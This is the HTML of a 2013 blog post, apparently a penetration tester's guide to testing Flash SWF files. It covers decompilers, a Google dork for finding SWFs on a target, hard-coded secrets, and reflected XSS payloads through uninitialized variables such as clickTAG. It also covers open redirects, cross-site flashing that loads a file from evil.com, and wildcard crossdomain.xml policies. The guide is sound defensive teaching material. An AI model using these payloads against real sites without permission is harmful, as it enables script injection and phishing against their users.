@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="utf-8">
+      <meta name="description" content=Giovanni Cattani's Blog>
+      <meta name="author" content=Giovanni Cattani>
+      <meta name="viewport" content="width=device-width">
+      <link rel="stylesheet" href="/css/syntax.css">
+      <link rel="stylesheet" href="/css/main.css">
+      <link rel="stylesheet" href="/css/normalize.css">
+      <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+      <link rel="icon" href="/favicon.ico" type="image/x-icon">
+      <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+      <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+      <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+      <script>
+   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+   m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+   })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+   ga('create', 'UA-39540268-1', 'gcattani.co.vu');
+   ga('send', 'pageview');
+</script>
+
+      <title>Flash Testing for Dummies</title>
+   </head>
+   
+   <body>
+      <main>
+         <header>
+            <h1 class="title"><a href="/">BoringSec</a></h1>
+         </header>
+
+         <article>
+   <h2>Flash Testing for Dummies</h2>
+   <hr>
+   <p><em>or: A Fast Flash Testing Guide for the Busy Pentester</em></p>
+
+<p>--</p>
+
+<p>The aim of this &quot;guide&quot; is to provide an up-to-date and easy way to test SWF files, without the assle of learning ActionScript or wasting excessive time, while still getting the relevant low hanging fruits.</p>
+
+<p><em>Note - All the techniques presented in this article have been tested and confirmed working in Chrome 23 with Flash 11.5, running on OS X 10.7.5.</em></p>
+
+<h3># Tools of the Trade</h3>
+
+<p>The most useful tool is probably <a href="http://h30499.www3.hp.com/t5/Following-the-Wh1t3-Rabbit/SWFScan-FREE-Flash-decompiler/ba-p/5440167">HP SWFScan</a>, which provides a decompiler and an automatic vulnerability scanner. While the software is prone to false negatives, it&#39;s still the best tool when you need to analyze ActionScript code in a limited time.</p>
+
+<p>If a Windows operating system is not an option or you&#39;d rather dive directly into the code without a fancy GUI, <a href="http://www.nowrap.de/flare.html">flare</a> is what you are looking for. Flare is a simple command-line decompiler, very reliable, but its development came to a halt in 2005.</p>
+
+<p>Other tools that might be useful are <a href="http://labs.adobe.com/downloads/swfinvestigator.html">Adobe SWF Investigator</a>, which provides a disassembler and other utilities, and <a href="http://www.swftools.org/">SWFTools</a>, a collection of several software that, sadly, lacks a decompiler. </p>
+
+<h3>1- Search Engine Discovery</h3>
+
+<p>In order to find all (most?) the SWF files on your target domain you just need a simple Google dork: <code>filetype:swf site:TARGET</code>.</p>
+
+<p>If the amount of files returned by the previous generic search is too much, try reducing it with <code>inurl:login</code>, <code>inurl:admin</code>, <code>inurl:secure</code> or similar.</p>
+
+<h3>2- Information Disclosure</h3>
+
+<p>There is literally anything you could find hard-coded inside SWF files: from remote gateways to authentication credentials, from IP addresses to remote resources.</p>
+
+<p>In order to identify all the interesting information inside of a SWF file, you need to decompile (or disassemble) it and review the code manually. Note that while SWFScan sometimes identifies critical data, it just isn&#39;t reliable enough to trust exclusively its automatic results.</p>
+
+<h3>3- Reflected Cross-Site Scripting</h3>
+
+<p>The main cause for XSS in Flash files is the use of <strong>uninitialized variables</strong>, which, if not initialized to a value, can be arbitrarily assigned by users. Furthermore, global variables (_root.*, _global.*, _level0.*) and unsafe methods (e.g. getURL, loadVars.*, XML.load, htmlText, loadVariables, loadMovie, loadMovieNum) need to be taken into account when looking for vulnerable code in Flash files. A sample payload that can be used to test for XSS is <code>javascript:alert(&#39;XSS&#39;)</code>.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">button 16 {
+    on (release) {
+        getURL(clickTAG, &#39;_self&#39;);
+    }
+}
+</code></pre></div>
+<p>The <em>clickTAG</em> variable in the previous decompiled code is not initialized and will accept any value. Hence, the XSS could be triggered trivially: <code>http://example.com/home.swf?clickTAG=javascript:alert(&#39;XSS&#39;)</code>.</p>
+
+<p>The following are all examples of code vulnerable to XSS.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">var __callResult_1 = getURL(_root.clickTag, &quot;_blank&quot;);
+var __callResult_2 = getURL(clickTag, &quot;_blank&quot;);
+var __callResult_3 = getURL(clickTag, &quot;&quot;);
+</code></pre></div>
+<p>On the other hand, <code>var __callResult_4 = getURL(&quot;http://example.com&quot;, &quot;_blank&quot;);</code> is not vulnerable.</p>
+
+<h3>4- Open Redirect</h3>
+
+<p>Uninitialized variables also cause SWFs to be vulnerable to Open Redirects, allowing an attacker to forge a URL that will redirect users to an arbitrary domain.</p>
+
+<p>If you find uninitialized variables in the code or a file that accepts a remote file as parameter (e.g. <code>http://example.com/supertrooper.swf?band=/abba.asp</code>), it is probably an open redirector and should be tested accordingly.</p>
+
+<h5>Recap: How to Test for XSS and Open Redirects</h5>
+
+<ol>
+<li>Get the SWF file</li>
+<li>Decompile it</li>
+<li>Scan the code with SWFScan</li>
+<li>Review the code checking for variables</li>
+<li>Test the variables that seem vulnerable (do not trust SWFScan)</li>
+</ol>
+
+<h3>5- Cross-Site Flashing</h3>
+
+<p>Cross-Site Flashing (XSF) occurs when an SWF file is able to load another file from a different domain. The vulnerable SWF can be exploited to load a malicious Flash file that can be used to perform several kinds of attacks, such as Cross-Site Scripting or Phishing via a fake interface. Let&#39;s take a look at some code:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">internal function frame1(){
+    this.url = &quot;&quot;;
+    this.movieurl = &quot;&quot;;
+    this.paramObj =
+    LoaderInfo(this.root.loaderInfo).parameters;
+    this.movieurl = String(this.paramObj[&quot;movieurl&quot;]);
+    if(this.movieurl != &quot;&quot;) {
+        this.LoadMovie(this.movieurl);
+    } else {
+        this.LoadMovie(&quot;defaulf.swf&quot;);
+    }
+    [...] 
+    {% highlight actionscript %}
+</code></pre></div>
+<p>As can be seen in the previous code, the <em>movieurl</em> variable is not initialized and the <em>LoadMovie</em> function accepts any value, even from external domains. So, the vulnerable SWF will load any file: <code>http://example.com/movie.swf?movieurl=http://evil.com/xss.swf</code></p>
+
+<h3>6- Crossdomain Policy</h3>
+
+<p>A SWF file is not allowed to access data that resides outside of its web domain and a sub-domain is not able to read data from a parent domain (and vice-versa). The Flash Player uses cross-domain policy files to give permission to access data from a given domain.</p>
+
+<p>Testing for a vulnerable cross-domain policy is trivial: take a look at the <code>/crossdomain.xml</code> file, always found in the website root. If it looks like the following code...</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">&lt;cross-domain-policy&gt;
+    &lt;allow-access-from domain=&quot;*&quot;/&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre></div>
+<p>...then the website accepts requests from Flash files from <strong>all</strong> domains and will return the full response.</p>
+
+<h3># References</h3>
+
+<p>Following are the articles and documents used to get most of the information presented in this post, listed chronologically.</p>
+
+<ul>
+<li>2006 - <a href="http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domain-ajax-with-flash">The Dangers of Cross-Domain Ajax with Flash</a> (by Chris Shiflett)</li>
+<li>2006 - <a href="http://shiflett.org/blog/2006/oct/the-crossdomain.xml-witch-hunt">The crossdomain.xml Witch Hunt</a> (by Chris Shiflett)</li>
+<li>2008 - <a href="http://jeremiahgrossman.blogspot.it/2008/05/crossdomainxml-invites-cross-site.html">Crossdomain.xml Invites Cross-site Mayhem</a> (by Jeremiah Grossman)</li>
+<li>2009 - <a href="http://www.blackhat.com/presentations/bh-dc-09/Jagdale/BlackHat-DC-09-Jagdale-Blinded-by-Flash.pdf">Blinded by Flash: Widespread Security Risks Flash Developers Don’t See</a> (by Prajakta Jagdale)</li>
+<li>2010 - <a href="http://www.blackhat.com/presentations/bh-dc-10/Bailey_Mike/BlackHat-DC-2010-Bailey-Neat-New-Ridiculous-flash-hacks-slides.pdf">Neat, New, and Ridiculous Flash Hack</a> (by Mike Bailey)</li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_flashing_%28OWASP-DV-004%29">OWASP - Testing for Cross Site Flashing</a></li>
+</ul>
+
+</article>
+
+<footer>
+   <div id="date" class="meta">
+      31 Mar 2013
+   </div>
+   <div id="return">
+      <a href="/">&laquo; Home Page</a>
+   </div>
+   <br>
+</footer>
+
+      </main>
+   </body>
+</html>
